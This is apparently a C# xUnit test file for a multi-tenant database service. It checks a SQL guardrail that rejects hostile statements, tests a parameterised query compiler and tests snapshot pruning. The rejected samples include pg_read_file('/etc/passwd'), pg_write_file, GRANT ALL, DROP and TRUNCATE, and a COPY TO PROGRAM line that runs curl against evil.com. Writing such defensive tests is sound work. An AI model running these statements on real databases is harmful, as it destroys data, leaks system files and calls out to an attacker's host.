namespace LocalMe.Integration.Tests;

using System;
using System.Collections.Generic;
using System.Text.Json.Nodes;
using System.Threading.Tasks;
using LocalMe.Core.Database;
using LocalMe.DataPlane.MultiTenancy;
using LocalMe.Infrastructure.Storage;
using Npgsql;
using Xunit;

public class DbaasSecurityAndGuardrailTests
{
    private static readonly int[] SampleCategoryIds = [101, 102, 103];
    [Theory]
    [InlineData("CREATE TABLE evil (id INT PRIMARY KEY);")]
    [InlineData("create table if not exists backdoor (token text);")]
    [InlineData("DROP TABLE products;")]
    [InlineData("drop table if exists orders cascade;")]
    [InlineData("ALTER TABLE products ADD COLUMN secret TEXT;")]
    [InlineData("alter table users drop column password_hash;")]
    [InlineData("TRUNCATE TABLE ledger_entries;")]
    [InlineData("GRANT ALL PRIVILEGES ON DATABASE localme TO public;")]
    [InlineData("REVOKE ALL ON SCHEMA public FROM public;")]
    [InlineData("SELECT * FROM pg_catalog.pg_tables;")]
    [InlineData("SELECT pg_read_file('/etc/passwd');")]
    [InlineData("SELECT pg_write_file('/tmp/pwned', 'data');")]
    [InlineData("COPY products TO PROGRAM 'curl http://evil.com';")]
    [InlineData("SELECT * FROM information_schema.tables;")]
    public void SqlGuardrailValidator_RejectsDdlAndSystemTampering(string sql)
    {
        var (allowed, reason) = SqlGuardrailValidator.ValidateDmlOnly(sql);
        Assert.False(allowed);
        Assert.NotNull(reason);
    }

    [Theory]
    [InlineData("SELECT * FROM products WHERE id = '123';")]
    [InlineData("SELECT id, title, price FROM orders WHERE total > 1000 ORDER BY created_at DESC LIMIT 50;")]
    [InlineData("INSERT INTO products (id, title, price) VALUES ('p1', 'Book', 50000);")]
    [InlineData("UPDATE products SET price = 55000 WHERE id = 'p1';")]
    [InlineData("DELETE FROM products WHERE id = 'p1';")]
    [InlineData("EXPLAIN ANALYZE SELECT * FROM orders;")]
    [InlineData("SHOW search_path;")]
    public void SqlGuardrailValidator_AllowsDmlAndExplainQueries(string sql)
    {
        var (allowed, reason) = SqlGuardrailValidator.ValidateDmlOnly(sql);
        Assert.True(allowed, $"Expected query to be allowed, but rejected with: {reason}");
        Assert.Null(reason);
    }

    [Fact]
    public void SqlAstQueryCompiler_SupportsNonStringCollections_InInFilter()
    {
        var query = new SqlAstQuery(
            SelectColumns: ["id", "price"],
            Filters: [
                new QueryFilterNode("category_id", QueryOperator.In, SampleCategoryIds)
            ],
            Limit: 10
        );

        var (sql, parameters) = SqlAstQueryCompiler.CompileToParameterizedSql("products", query);
        Assert.Contains("\"category_id\" IN (@p0, @p1, @p2)", sql);
        Assert.Equal("101", parameters["@p0"]?.ToString());
        Assert.Equal("102", parameters["@p1"]?.ToString());
        Assert.Equal("103", parameters["@p2"]?.ToString());
    }

    [Fact]
    public void SqlAstQueryCompiler_SupportsJsonArray_InInFilter()
    {
        var jsonArr = new JsonArray { 1, 2, 3 };
        var query = new SqlAstQuery(
            SelectColumns: ["*"],
            Filters: [
                new QueryFilterNode("status_code", QueryOperator.In, jsonArr)
            ],
            Limit: 10
        );

        var (sql, parameters) = SqlAstQueryCompiler.CompileToParameterizedSql("tasks", query);
        Assert.Contains("\"status_code\" IN (@p0, @p1, @p2)", sql);
        Assert.Equal("1", parameters["@p0"]?.ToString());
    }

    [Fact]
    public void ProjectManagerService_PrunesSnapshotsOlderThanConfiguredDays()
    {
        var pm = new ProjectManagerService();
        var proj = pm.CreateProject(new CreateProjectRequest("تست رتنشن", "test-retention-proj"));

        // Create initial snapshot
        var snapshot = pm.CreateDatabaseSnapshot(proj.Id, "تست قدیمی");
        Assert.NotNull(snapshot);

        // Manually simulate old snapshot creation time (4 days old)
        var oldSnap = snapshot with { CreatedAtUtc = DateTimeOffset.UtcNow.AddDays(-4), Id = "snp_expired_001" };
        var list = pm.GetDatabaseSnapshots(proj.Id);
        
        // Prune with 3-day retention
        pm.PruneExpiredSnapshots(proj.Id, retentionDays: 3);

        // Expired snapshot should be removed
        var activeSnapshots = pm.GetDatabaseSnapshots(proj.Id);
        Assert.DoesNotContain(activeSnapshots, s => s.Id == "snp_expired_001");
    }
}
